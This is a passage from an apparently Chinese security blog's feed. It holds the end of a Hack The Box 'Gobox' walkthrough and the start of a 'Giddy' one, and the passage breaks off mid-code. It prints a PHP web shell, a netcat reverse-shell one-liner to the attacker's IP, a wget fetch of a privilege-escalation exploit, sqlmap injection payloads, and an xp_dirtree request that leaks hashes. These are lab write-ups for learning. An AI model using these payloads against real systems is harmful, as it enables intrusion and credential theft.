class="hljs-string">&quot;Home page&quot;</span>, Body:<span class="hljs-string">&quot;Welcome to our brand new home page.&quot;</span>&#125;<br>renderTemplate(w, <span class="hljs-string">&quot;index&quot;</span>, page)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;POST&quot;</span>:<br>page := &amp;Data&#123;Title:<span class="hljs-string">&quot;Home page&quot;</span>, Body:<span class="hljs-string">&quot;Welcome to our brand new home page.&quot;</span>&#125;<br>    <span class="hljs-keyword">if</span> r.FormValue(<span class="hljs-string">&quot;password&quot;</span>) == <span class="hljs-string">&quot;ippsSecretPassword&quot;</span> &#123;<br>      renderTemplate(w, <span class="hljs-string">&quot;source&quot;</span>, page )<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      renderTemplate(w, <span class="hljs-string">&quot;index&quot;</span>, page)<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForgotHandler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;<br>    <span class="hljs-keyword">switch</span> r.Method &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;GET&quot;</span>:<br>      page := &amp;Data&#123;Title:<span class="hljs-string">&quot;Forgot Password&quot;</span>, Body:<span class="hljs-string">&quot;&quot;</span>&#125;<br>      renderTemplate(w, <span class="hljs-string">&quot;forgot&quot;</span>, page)<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;POST&quot;</span>:<br>      <span class="hljs-keyword">var</span> user1 = &amp;User&#123;<span class="hljs-number">1</span>, <span class="hljs-string">&quot;ippsec@hacking.esports&quot;</span>, <span class="hljs-string">&quot;ippsSecretPassword&quot;</span>&#125;<br>      <span class="hljs-keyword">var</span> tmpl = fmt.Sprintf(<span class="hljs-string">`Email Sent To: %s`</span>, r.FormValue(<span class="hljs-string">&quot;email&quot;</span>))<br><br>      t, err := template.New(<span class="hljs-string">&quot;page&quot;</span>).Parse(tmpl)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>          fmt.Println(err)<br>      &#125;<br><br>      <span class="hljs-keyword">var</span> tpl bytes.Buffer<br>      t.Execute(&amp;tpl, &amp;user1)<br>      page := &amp;Data&#123;Title:<span class="hljs-string">&quot;Forgot Password&quot;</span>, Body:tpl.String()&#125;<br>      renderTemplate(w, <span class="hljs-string">&quot;forgot&quot;</span>, page)<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>  http.HandleFunc(<span class="hljs-string">&quot;/&quot;</span>, IndexHandler)<br>  http.HandleFunc(<span class="hljs-string">&quot;/forgot/&quot;</span>, ForgotHandler)<br>  log.Fatal(http.ListenAndServe(<span class="hljs-string">&quot;:80&quot;</span>, <span class="hljs-literal">nil</span>))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这就是登录页面的代码，最感兴趣的肯定是这里了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(u User)</span></span> DebugCmd (test <span class="hljs-type">string</span>) <span class="hljs-type">string</span> &#123;<br>  ipp := strings.Split(test, <span class="hljs-string">&quot; &quot;</span>)<br>  bin := strings.Join(ipp[:<span class="hljs-number">1</span>], <span class="hljs-string">&quot; &quot;</span>)<br>  args := strings.Join(ipp[<span class="hljs-number">1</span>:], <span class="hljs-string">&quot; &quot;</span>)<br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(args) &gt; <span class="hljs-number">0</span>&#123;<br>    out, _ := exec.Command(bin, args).CombinedOutput()<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    out, _ := exec.Command(bin).CombinedOutput()<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(out)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Go模板中使用函数：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.calhoun.io<span class="hljs-regexp">/intro-to-templates-p3-functions/</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211049694.png" alt="image-20220822211049694"></p><p>但尝试弹shell不行：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211246776.png" alt="image-20220822211246776"></p><p>还是在一个docker容器里：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211413288.png" alt="image-20220822211413288"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211612982.png" alt="image-20220822211612982"></p><p>aws主机名，</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211650929.png" alt="image-20220822211650929"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822214652586.png" alt="image-20220822214652586"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822211733515.png" alt="image-20220822211733515"></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">Crazy:~/HackThebox$ echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;|base64    </span><br><span class="language-xml">PD9waHAgZWNobyBzaGVsbF9leGVjKCRfUkVRVUVTVFsiY21kIl0pOyA/Pgo=</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822213517625.png" alt="image-20220822213517625"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822213534051.png" alt="image-20220822213534051"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">aws</span> <span class="hljs-built_in">s3</span> <span class="hljs-meta">cp</span> ./shell.php <span class="hljs-built_in">s3</span>:<span class="hljs-comment">//website/shell.php</span><br></code></pre></td></tr></table></figure><p>把shell.php放到存储桶里：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822213645169.png" alt="image-20220822213645169"></p><p>存储桶对应的是80端口的目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ curl http://10.10.11.113/shell.php?cmd=<span class="hljs-built_in">ls</span><br>bottom.png<br>css<br>header.png<br>index.html<br>index.php<br>shell.php<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Crazy</span>:~/HackThebox$ curl http://<span class="hljs-number">10.10.11.113</span>/shell.php?cmd=rm%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">3</span>Bmkfifo%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">3</span>Bcat%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff%<span class="hljs-number">7</span>C%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fsh%<span class="hljs-number">20</span>-i%<span class="hljs-number">202</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">7</span>Cnc%<span class="hljs-number">2010</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">3</span>%<span class="hljs-number">201337</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">2</span>Ftmp%<span class="hljs-number">2</span>Ff<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.11.113] 48758<br>/bin/sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ script -qc /bin/sh /dev/null</span><br><span class="hljs-string">$ script -qc /bin/bash /dev/null</span><br><span class="hljs-string">script -qc /bin/bash /dev/null</span><br><span class="hljs-string">www-data@gobox:/opt/website$ </span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@gobox:/opt/website$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/bin/umount<br>/usr/bin/passwd<br>/usr/bin/su<br>/usr/bin/fusermount<br>/usr/bin/pkexec<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/mount<br>/usr/bin/sudo<br>/usr/bin/at<br>www-data@gobox:/opt/website$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux gobox 5.4.0-81-generic <span class="hljs-comment">#91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@gobox:/opt/website$ wget http://10.10.16.3/pwk.py<br>wget http://10.10.16.3/pwk.py<br>--2022-08-22 13:48:05--  http://10.10.16.3/pwk.py<br>Connecting to 10.10.16.3:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: <span class="hljs-string">&#x27;pwk.py&#x27;</span><br><br>pwk.py              100%[===================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2022-08-22 13:48:06 (33.8 MB/s) - <span class="hljs-string">&#x27;pwk.py&#x27;</span> saved [3448/3448]<br><br>www-data@gobox:/opt/website$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>bottom.png  css  header.png  index.html  index.php  pwk.py  shell.php<br>www-data@gobox:/opt/website$ python pwk.py<br>python pwk.py<br><br>Command <span class="hljs-string">&#x27;python&#x27;</span> not found, did you mean:<br><br>  <span class="hljs-built_in">command</span> <span class="hljs-string">&#x27;python3&#x27;</span> from deb python3<br>  <span class="hljs-built_in">command</span> <span class="hljs-string">&#x27;python&#x27;</span> from deb python-is-python3<br><br>www-data@gobox:/opt/website$ python3 pwk.py<br>python3 pwk.py<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><span class="hljs-comment">#   </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Giddy</title>
    <link href="/post/HackTHeBox-Giddy.html"/>
    <url>/post/HackTHeBox-Giddy.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ sudo rustscan -r 1-65535 --<span class="hljs-built_in">ulimit</span> 5000 --no-nmap 10.10.10.104<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |<br>| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |<br>`-<span class="hljs-string">&#x27; `-&#x27;</span>`-----<span class="hljs-string">&#x27;`----&#x27;</span>  `-<span class="hljs-string">&#x27;  `----&#x27;</span>  `---<span class="hljs-string">&#x27; `-&#x27;</span>  `-<span class="hljs-string">&#x27;`-&#x27;</span> `-<span class="hljs-string">&#x27;</span><br><span class="hljs-string">Faster Nmap scanning with Rust.</span><br><span class="hljs-string">________________________________________</span><br><span class="hljs-string">: https://discord.gg/GFrQsGy           :</span><br><span class="hljs-string">: https://github.com/RustScan/RustScan :</span><br><span class="hljs-string"> --------------------------------------</span><br><span class="hljs-string">😵 https://admin.tryhackme.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="hljs-string">[~] Automatically increasing ulimit value to 5000.</span><br><span class="hljs-string">Open 10.10.10.104:80</span><br><span class="hljs-string">Open 10.10.10.104:443</span><br><span class="hljs-string">Open 10.10.10.104:3389</span><br><span class="hljs-string">Open 10.10.10.104:5985</span><br><span class="hljs-string">10.10.10.104 -&gt; [80,443,3389,5985]</span><br><span class="hljs-string">Crazyinside:~/HackTheBox$ sudo nmap -sCV -Pn -p1-10000 10.10.10.104</span><br><span class="hljs-string">[sudo] crayzinside 的密码：</span><br><span class="hljs-string">Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-16 17:25 CST</span><br><span class="hljs-string">Nmap scan report for 10.10.10.104</span><br><span class="hljs-string">Host is up (0.25s latency).</span><br><span class="hljs-string">Not shown: 9989 filtered tcp ports (no-response), 7 filtered tcp ports (host-unreach)</span><br><span class="hljs-string">PORT     STATE SERVICE       VERSION</span><br><span class="hljs-string">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: TRACE</span><br><span class="hljs-string">|_http-title: IIS Windows Server</span><br><span class="hljs-string">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="hljs-string">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="hljs-string">| tls-alpn: </span><br><span class="hljs-string">|   h2</span><br><span class="hljs-string">|_  http/1.1</span><br><span class="hljs-string">|_ssl-date: 2022-08-16T09:29:18+00:00; 0s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite</span><br><span class="hljs-string">| Not valid before: 2018-06-16T21:28:55</span><br><span class="hljs-string">|_Not valid after:  2018-09-14T21:28:55</span><br><span class="hljs-string">|_http-title: IIS Windows Server</span><br><span class="hljs-string">| http-methods: </span><br><span class="hljs-string">|_  Potentially risky methods: TRACE</span><br><span class="hljs-string">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="hljs-string">|_ssl-date: 2022-08-16T09:29:18+00:00; 0s from scanner time.</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=Giddy</span><br><span class="hljs-string">| Not valid before: 2022-08-15T09:23:46</span><br><span class="hljs-string">|_Not valid after:  2023-02-14T09:23:46</span><br><span class="hljs-string">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="hljs-string">|_http-title: Not Found</span><br><span class="hljs-string">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="hljs-string">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="hljs-string"></span><br><span class="hljs-string">Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 210.29 seconds</span><br><span class="hljs-string">zsh: segmentation fault  sudo nmap -sCV -Pn -p1-10000 10.10.10.104</span><br></code></pre></td></tr></table></figure><p>80页面一个IIS默认页面被替换成了一只乘车将头探出窗外吹风的狗：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195445842.png" alt="image-20220816195445842"></p><p>feroxbuster用来枚举目录是一个很好的工具，它默认会进行递归枚举：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ feroxbuster -u http://10.10.10.104/ <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.7.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://10.10.10.104/<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<br> 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.7.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br> 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>200      GET       32l       55w      700c http://10.10.10.104/<br>301      GET        2l       10w      157c http://10.10.10.104/aspnet_client =&gt; http://10.10.10.104/aspnet_client/<br>302      GET        3l        8w      157c http://10.10.10.104/remote =&gt; /Remote/default.aspx?ReturnUrl=%2fremote<br>301      GET        2l       10w      157c http://10.10.10.104/Aspnet_client =&gt; http://10.10.10.104/Aspnet_client/<br>301      GET        2l       10w      147c http://10.10.10.104/mvc =&gt; http://10.10.10.104/mvc/<br>301      GET        2l       10w      154c http://10.10.10.104/mvc/images =&gt; http://10.10.10.104/mvc/images/<br>301      GET        2l       10w      155c http://10.10.10.104/mvc/scripts =&gt; http://10.10.10.104/mvc/scripts/<br>301      GET        2l       10w      155c http://10.10.10.104/mvc/content =&gt; http://10.10.10.104/mvc/content/<br>301      GET        2l       10w      155c http://10.10.10.104/mvc/Scripts =&gt; http://10.10.10.104/mvc/Scripts/<br>301      GET        2l       10w      155c http://10.10.10.104/mvc/account =&gt; http://10.10.10.104/mvc/account/<br>301      GET        2l       10w      154c http://10.10.10.104/mvc/Images =&gt; http://10.10.10.104/mvc/Images/<br>301      GET        2l       10w      162c http://10.10.10.104/mvc/content/themes =&gt; http://10.10.10.104/mvc/content/themes/<br></code></pre></td></tr></table></figure><p>443端口与80端口是一样的狗：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816195843081.png" alt="image-20220816195843081"></p><p>大概能够猜出来，80与443为同一个站点，再暂不考虑端口漏扫的情况下，那只有枚举目录了，但我猜443与80路径也一样。一个是加密一个不加密而已。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200424856.png" alt="image-20220816200424856"></p><p>可以自己注册一个账户，页面没什么好稀奇的，但是似乎有SQL注入：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816200501165.png" alt="image-20220816200501165"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ sqlmap -u <span class="hljs-string">&quot;https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=19&quot;</span> --batch<br>        ___<br>       __H__<br> ___ ___[<span class="hljs-string">&quot;]_____ ___ ___  &#123;1.6.7#stable&#125;</span><br><span class="hljs-string">|_ -| . [(]     | .&#x27;| . |</span><br><span class="hljs-string">|___|_  [)]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 20:05:33 /2022-08-16/</span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 25 columns</span><br><span class="hljs-string">    Payload: ProductSubCategoryId=19 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(113)+CHAR(82)+CHAR(118)+CHAR(101)+CHAR(72)+CHAR(65)+CHAR(71)+CHAR(118)+CHAR(116)+CHAR(121)+CHAR(68)+CHAR(78)+CHAR(118)+CHAR(122)+CHAR(84)+CHAR(116)+CHAR(102)+CHAR(84)+CHAR(121)+CHAR(84)+CHAR(122)+CHAR(107)+CHAR(73)+CHAR(73)+CHAR(65)+CHAR(111)+CHAR(110)+CHAR(107)+CHAR(67)+CHAR(80)+CHAR(109)+CHAR(76)+CHAR(114)+CHAR(122)+CHAR(79)+CHAR(84)+CHAR(88)+CHAR(121)+CHAR(74)+CHAR(98)+CHAR(83)+CHAR(113)+CHAR(122)+CHAR(107)+CHAR(118)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hvhE</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[20:07:45] [INFO] testing Microsoft SQL Server</span><br><span class="hljs-string">[20:07:46] [INFO] confirming Microsoft SQL Server</span><br><span class="hljs-string">[20:07:54] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="hljs-string">web server operating system: Windows 2016 or 10 or 2019</span><br><span class="hljs-string">web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET</span><br><span class="hljs-string">back-end DBMS: Microsoft SQL Server 2016</span><br><span class="hljs-string">[20:07:54] [WARNING] HTTP error codes detected during run:</span><br><span class="hljs-string">500 (Internal Server Error) - 23 times</span><br><span class="hljs-string">[20:07:54] [INFO] fetched data logged to text files under &#x27;/home/crayzinside/.local/share/sqlmap/output/10.10.10.104&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[20:08:47] [INFO] the back-end DBMS is Microsoft SQL Server<br>web server operating system: Windows 2016 or 10 or 2019<br>web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET<br>back-end DBMS: Microsoft SQL Server 2016<br>[20:08:47] [INFO] fetching database names<br>[20:08:49] [WARNING] reflective value(s) found and filtering out<br>available databases [5]:<br>[*] Injection<br>[*] master<br>[*] model<br>[*] msdb<br>[*] tempdb<br><br>[20:08:49] [INFO] fetched data logged to text files under <span class="hljs-string">&#x27;/home/crayzinside/.local/share/sqlmap/output/10.10.10.104&#x27;</span><br><br>[*] ending @ 20:08:49 /2022-08-16/<br></code></pre></td></tr></table></figure><p>数据库里边没什么东西，但是目标是一个windows操作系统，可能会有哈希泄露：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\10.10.16.3\<span class="hljs-built_in">test</span>%22;%20--<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 